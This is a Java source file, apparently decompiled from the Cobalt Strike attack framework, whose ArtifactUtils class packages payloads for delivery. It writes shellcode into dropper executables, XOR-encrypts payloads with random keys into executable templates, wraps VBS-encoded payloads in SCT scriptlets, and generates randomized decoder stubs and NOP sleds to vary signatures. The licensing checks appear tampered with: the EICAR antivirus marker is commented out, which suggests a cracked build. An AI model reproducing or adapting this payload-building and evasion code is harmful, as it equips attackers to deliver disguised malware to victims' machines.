package common;

import aggressor.AggressorClient;
import encoders.NetBIOS;
import encoders.XorEncoder;
import pe.PEEditor;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Stack;

public class ArtifactUtils {
    protected AggressorClient client;

    public ArtifactUtils(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void setupDropper(byte[] arrby, String string, String string2, String string3) {
        CommonUtils.writeToFile(new File(string3), this._setupDropper(arrby, string, string2));
    }

    public byte[] _setupDropper(byte[] arrby, String string, String string2) {
        Stack<Scalar> stack = new Stack<>();
        stack.push(SleepUtils.getScalar(string2));
        stack.push(SleepUtils.getScalar(string));
        stack.push(SleepUtils.getScalar(arrby));
        String string3 = this.client.getScriptEngine().format("DROPPER_ARTIFACT_GENERATOR", stack);
        if (string3 == null) {
            return this.fixChecksum(this.__setupDropper(arrby, string, string2));
        }
        return this.fixChecksum(CommonUtils.toBytes(string3));
    }

    public byte[] fixChecksum(byte[] arrby) {
        if (License.isTrial()) {
            return arrby;
        }
        try {
            PEEditor pEEditor = new PEEditor(arrby);
            pEEditor.updateChecksum();
            return pEEditor.getImage();
        } catch (Throwable throwable) {
            MudgeSanity.logException("fixChecksum() failed for " + arrby.length + " byte file. Skipping the checksum update", throwable, false);
            return arrby;
        }
    }

    public byte[] __setupDropper(byte[] arrby, String string, String string2) {
        byte[] arrby2 = CommonUtils.readFile(string);
        Packer packer = new Packer();
        packer.little();
        packer.addInteger(string2.length() + 1);
        packer.addInteger(arrby2.length);
        byte[] arrby3 = packer.getBytes();
        String string3 = CommonUtils.bString(arrby);
        int n = string3.indexOf("DROPPER!");
        string3 = CommonUtils.replaceAt(string3, CommonUtils.bString(arrby3), n);
        string3 = string3 + string2 + '\u0000';
        string3 = string3 + CommonUtils.bString(arrby2);
        return CommonUtils.toBytes(string3);
    }

    public byte[] patchArtifact(byte[] arrby, String string) {
        Stack<Scalar> stack = new Stack<>();
        stack.push(SleepUtils.getScalar(arrby));
        stack.push(SleepUtils.getScalar(string));
        String string2 = this.client.getScriptEngine().format("EXECUTABLE_ARTIFACT_GENERATOR", stack);
        if (string2 == null) {
            return this.fixChecksum(this._patchArtifact(arrby, string));
        }
        return this.fixChecksum(CommonUtils.toBytes(string2));
    }

    public byte[] _patchArtifact(byte[] arrby, String string) {
        try {
            InputStream inputStream = CommonUtils.resource("resources/" + string);
            byte[] arrby2 = CommonUtils.readAll(inputStream);
            inputStream.close();
            byte[] arrby3 = new byte[]{(byte) CommonUtils.rand(254), (byte) CommonUtils.rand(254), (byte) CommonUtils.rand(254), (byte) CommonUtils.rand(254)};
            byte[] arrby4 = new byte[arrby.length];
            for (int i = 0; i < arrby.length; ++i) {
                arrby4[i] = (byte) (arrby[i] ^ arrby3[i % 4]);
            }
            String string2 = CommonUtils.bString(arrby2);
            int n = string2.indexOf(CommonUtils.repeat("A", 1024));
            Packer packer = new Packer();
            packer.little();
            packer.addInteger(n + 16);
            packer.addInteger(arrby.length);
            packer.addString(arrby3, arrby3.length);
            packer.addString("aaaa", 4);
            packer.addString(arrby4, arrby4.length);
            if (!License.isTrial()) {
                // packer.addString("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
                CommonUtils.print_trial("Added EICAR string to " + string);
            }
            byte[] arrby5 = packer.getBytes();
            string2 = CommonUtils.replaceAt(string2, CommonUtils.bString(arrby5), n);
            return CommonUtils.toBytes(string2);
        } catch (IOException iOException) {
            MudgeSanity.logException("patchArtifact", iOException, false);
            return new byte[0];
        }
    }

    public void patchArtifact(byte[] arrby, String string, String string2) {
        byte[] arrby2 = this.patchArtifact(arrby, string);
        CommonUtils.writeToFile(new File(string2), arrby2);
    }

    public static String escape(byte[] arrby) {
        StringBuilder StringBuilder = new StringBuilder(arrby.length * 10);
        for (byte anArrby : arrby) {
            StringBuilder.append("\\u");
            StringBuilder.append(CommonUtils.toUnicodeEscape(anArrby));
        }
        return StringBuilder.toString();
    }

    public byte[] buildSCT(byte[] arrby) {
        String string = CommonUtils.bString(CommonUtils.readResource("resources/template.sct")).trim();
        string = CommonUtils.strrep(string, "$$PROGID$$", CommonUtils.garbage("progid"));
        string = CommonUtils.strrep(string, "$$CLASSID$$", CommonUtils.ID());
        string = CommonUtils.strrep(string, "$$CODE$$", CommonUtils.bString(new MutantResourceUtils(this.client).buildVBS(arrby)));
        return CommonUtils.toBytes(string);
    }

    public static boolean isLetter(byte by) {
        char c = (char) by;
        return c == '_' || c == ' ' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c == '0' || c >= '1' && c <= '9';
    }

    public static String toVBS(byte[] arrby) {
        return ArtifactUtils.toVBS(arrby, 8);
    }

    public static List toChunk(String string, int n) {
        LinkedList<String> linkedList = new LinkedList<>();
        StringBuilder StringBuilder = new StringBuilder();
        for (int i = 0; i < string.length(); ++i) {
            StringBuilder.append(string.charAt(i));
            if (StringBuilder.length() < n) continue;
            linkedList.add(StringBuilder.toString());
            StringBuilder = new StringBuilder();
        }
        if (StringBuilder.length() > 0) {
            linkedList.add(StringBuilder.toString());
        }
        return linkedList;
    }

    public static String toVBS(byte[] arrby, int n) {
        StringBuilder object;
        LinkedList<String> linkedList = new LinkedList<>();
        for (int i = 0; i < arrby.length; ++i) {
            if (ArtifactUtils.isLetter(arrby[i])) {
                object = new StringBuilder();
                object.append("\"");
                object.append((char) arrby[i]);
                while (i + 1 < arrby.length && ArtifactUtils.isLetter(arrby[i + 1]) && object.length() <= n) {
                    object.append((char) arrby[i + 1]);
                    ++i;
                }
                object.append("\"");
                linkedList.add(object.toString());
                continue;
            }
            linkedList.add("Chr(" + arrby[i] + ")");
        }
        StringBuilder StringBuilder = new StringBuilder(arrby.length * 10);
        Iterator iterator = linkedList.iterator();
        int n2 = 0;
        int n3 = 0;
        while (iterator.hasNext()) {
            String string = (String) iterator.next();
            StringBuilder.append(string);
            if ((n2 += string.length() + 1) > 200 && iterator.hasNext()) {
                StringBuilder.append("& _\n");
                n2 = 0;
                n3 = 0;
            } else if (n3 >= 32 && iterator.hasNext()) {
                StringBuilder.append("& _\n");
                n2 = 0;
                n3 = 0;
            } else if (iterator.hasNext()) {
                StringBuilder.append("&");
            }
            ++n3;
        }
        return StringBuilder.toString();
    }

    public static String toHex(byte[] arrby) {
        StringBuilder StringBuilder = new StringBuilder(arrby.length * 3);
        for (byte anArrby : arrby) {
            int n = (anArrby & 240) >> 4;
            int n2 = anArrby & 15;
            StringBuilder.append(Integer.toHexString(n));
            StringBuilder.append(Integer.toHexString(n2));
        }
        return StringBuilder.toString();
    }

    public static String AlphaEncode(byte[] arrby) {
        AssertUtils.Test(arrby.length > 16384, "AlphaEncode used on a stager (or some other small thing)");
        return ArtifactUtils._AlphaEncode(arrby);
    }

    public static String _AlphaEncode(byte[] arrby) {
        String string = CommonUtils.bString(CommonUtils.readResource("resources/netbios.bin"));
        string = string + "gogo";
        string = string + NetBIOS.encode('A', arrby);
        string = string + "aa";
        return string;
    }

    public static byte[] randomNOP() {
        LinkedList<byte[]> linkedList = new LinkedList<>();
        linkedList.add(new byte[]{-112});
        linkedList.add(new byte[]{-121, -37});
        linkedList.add(new byte[]{-121, -55});
        linkedList.add(new byte[]{-121, -46});
        linkedList.add(new byte[]{-121, -1});
        linkedList.add(new byte[]{-121, -10});
        linkedList.add(new byte[]{102, -112});
        linkedList.add(new byte[]{102, -121, -37});
        linkedList.add(new byte[]{102, -121, -55});
        linkedList.add(new byte[]{102, -121, -46});
        linkedList.add(new byte[]{102, -121, -1});
        linkedList.add(new byte[]{102, -121, -10});
        return (byte[]) CommonUtils.pick(linkedList);
    }

    public static byte[] XorStubBegin() {
        Packer packer = new Packer();
        packer.addByte(252);
        packer.addByte(232);
        int n = CommonUtils.rand(31) + 1;
        byte[] arrby = CommonUtils.randomData(n);
        packer.little();
        packer.addInt(n);
        packer.append(arrby);
        return packer.getBytes();
    }

    public static byte[] XorStub() {
        byte[] arrby = CommonUtils.pickOption("resources/xor.bin");
        arrby = CommonUtils.shift(arrby, 6);
        byte[] arrby2 = ArtifactUtils.XorStubBegin();
        return CommonUtils.join(arrby2, arrby);
    }

    public static byte[] _XorEncode(byte[] arrby, String string) {
        AssertUtils.TestArch(string);
        if ("x86".equals(string)) {
            byte[] arrby2 = ArtifactUtils.XorStub();
            byte[] arrby3 = XorEncoder.encode(arrby);
            return CommonUtils.join(arrby2, arrby3);
        }
        if ("x64".equals(string)) {
            byte[] arrby4 = CommonUtils.readResource("resources/xor64.bin");
            byte[] arrby5 = XorEncoder.encode(arrby);
            return CommonUtils.join(arrby4, arrby5);
        }
        return new byte[0];
    }

    public static byte[] XorEncode(byte[] arrby, String string) {
        if (!License.isTrial()) {
            CommonUtils.print_trial("Disabled " + string + " payload stage encoding.");
            return arrby;
        }
        AssertUtils.Test(arrby.length > 16384, "XorEncode used on a stager (or some other small thing)");
        return ArtifactUtils._XorEncode(arrby, string);
    }

    public static void main(String[] arrstring) {
        for (int i = 0; i < 10; ++i) {
            CommonUtils.print_info(CommonUtils.toHexString(ArtifactUtils.XorStubBegin()));
        }
    }
}

